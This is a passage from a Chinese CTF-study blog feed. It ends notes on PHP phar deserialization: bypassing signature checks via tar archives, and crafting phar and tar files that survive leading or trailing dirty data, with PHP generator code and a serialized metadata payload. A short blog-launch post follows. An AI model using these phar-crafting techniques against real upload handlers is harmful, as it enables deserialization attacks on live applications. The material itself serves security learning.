因为文件本身保存的签名是二进制格式的</p><p>其它签名算法同理, 就是切片的长度不一样 (不过一般也不怎么用到)</p><p>phar 协议对 gzip bzip2 处理时, PHP 会将其解压缩, 然后解析里面的 phar 文件</p><h2 id="tar文件绕过签名"><a href="#tar文件绕过签名" class="headerlink" title="tar文件绕过签名"></a>tar文件绕过签名</h2><p>对 tar 处理时, PHP 会检测压缩包中是否存在 <code>.phar/.metadata</code>, 存在的话就会将 <code>.metadata</code> 里的内容<strong>直接进行反序列化</strong></p><p>本地创建 .phar 文件夹和 .metadata 文件</p><div class="code-wrapper"><pre><code class="hljs ruby">exp10it<span class="hljs-variable">@LAPTOP</span>-<span class="hljs-variable constant_">TBAF1QQG</span><span class="hljs-symbol">:~/WWW/</span>.phar<span class="hljs-variable">$ </span>ls -a.metadataexp10it<span class="hljs-variable">@LAPTOP</span>-<span class="hljs-variable constant_">TBAF1QQG</span><span class="hljs-symbol">:~/WWW/</span>.phar<span class="hljs-variable">$ </span>cat .metadata<span class="hljs-symbol">O:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;A&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;text&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">7</span><span class="hljs-symbol">:<span class="hljs-string">&quot;success&quot;</span></span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">tar -cf phar.tar .phar/</code></pre></div><p>我也是用phpstudy不成功，应该跟php版本有关</p><p><img src="/../images/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231105181214981.png" alt="image-20231105181214981"></p><h2 id="绕过文件头部的脏数据（我们可以修改内容"><a href="#绕过文件头部的脏数据（我们可以修改内容" class="headerlink" title="绕过文件头部的脏数据（我们可以修改内容)"></a>绕过文件头部的脏数据（我们可以修改内容)</h2><p>假如遇到绕wakeup的phar反序列化，我们需要修改phar文件的内容，那我们只需要重新计算一下签名，然后把计算完签名后的phar文件的脏数据删掉，然后上传就行了。</p><p>。。。说实话没搞懂</p><h2 id="绕过文件头部脏数据（数据修改在服务端"><a href="#绕过文件头部脏数据（数据修改在服务端" class="headerlink" title="绕过文件头部脏数据（数据修改在服务端)"></a>绕过文件头部脏数据（数据修改在服务端)</h2><p>如果是日志的话一般可以用php:&#x2F;&#x2F;filter把数据清空</p><h3 id="利用要点"><a href="#利用要点" class="headerlink" title="利用要点"></a>利用要点</h3><p>我们已知脏数据的内容，是在上传文件后拼接脏数据</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>把脏数据拼接在<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>之前，然后生成phar文件（这样生成的文件的签名是带有脏数据的），接着手动删除前面的脏数据然后上传，服务端会去拼接，等于说我们事先就生成好了签名</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>&#123;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> flag;<span class="hljs-comment">//前面的脏数据</span><span class="hljs-variable">$dirtydata</span> = <span class="hljs-string">&quot;dirty&quot;</span>;<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-variable">$dirtydata</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="hljs-comment">// 因为它是phar文件的开头，拼接在他的前面即为脏数据</span><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;anything&quot;</span> , <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;./phar.phar&quot;</span>);<span class="hljs-variable">$post_exp</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$exp</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$dirtydata</span>));   <span class="hljs-comment">//截取脏数据之后的数据</span><span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;./break_phar.phar&quot;</span>,<span class="hljs-variable">$post_exp</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>这里有一部分细节的，就是，我们不能用记事本打开手动删除，不知道为什么这样会破坏数据，我们需要用php代码去修改   （boogipop大佬说的）</p><h2 id="绕过文件尾部的脏数据"><a href="#绕过文件尾部的脏数据" class="headerlink" title="绕过文件尾部的脏数据"></a>绕过文件尾部的脏数据</h2><p>tar格式自动忽略尾部脏数据，因为tar格式有暂停解析位，在之后添加的数据都不会解析的     </p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>&#123;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> flag;<span class="hljs-comment">//前面的脏数据</span><span class="hljs-variable">$dirtydata</span> = <span class="hljs-string">&quot;dirty&quot;</span>;<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PharData</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/phar.tar&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;phartest&quot;</span>, <span class="hljs-title class_">Phar</span>::<span class="hljs-variable constant_">TAR</span>);<span class="hljs-comment">//$phar = new Phar(&quot;1.phar&quot;)</span><span class="hljs-comment">//$phar-&gt;convertToExecutable(Phar::TAR) #会生成1.phar.tar</span><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//下面$dirtydata是可以自定义的</span><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-variable">$dirtydata</span> , <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;./phar.tar&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>唉，啥都不会，自己还懒</p><p>这篇发完后又得过一段时间才能写下一篇了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>新征程</title>
    <link href="/2023/07/31/%E6%96%B0%E5%BE%81%E7%A8%8B/"/>
    <url>/2023/07/31/%E6%96%B0%E5%BE%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="新起点，勇往直前"><a href="#新起点，勇往直前" class="headerlink" title="新起点，勇往直前"></a>新起点，勇往直前</h2><p>从搭建好自己的博客开始，作为新起点，记录自己的刷题</p><p>本来是不喜欢写文章的，但发现要记录的有很多，便开始搭博客</p><p>要比过去认真刷题，遇到题目多做，不要只看别人WP就认为自己会了，我可是深受其害。</p><p>就这样吧<img src="/%E6%96%B0%E5%BE%81%E7%A8%8B/fluid.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
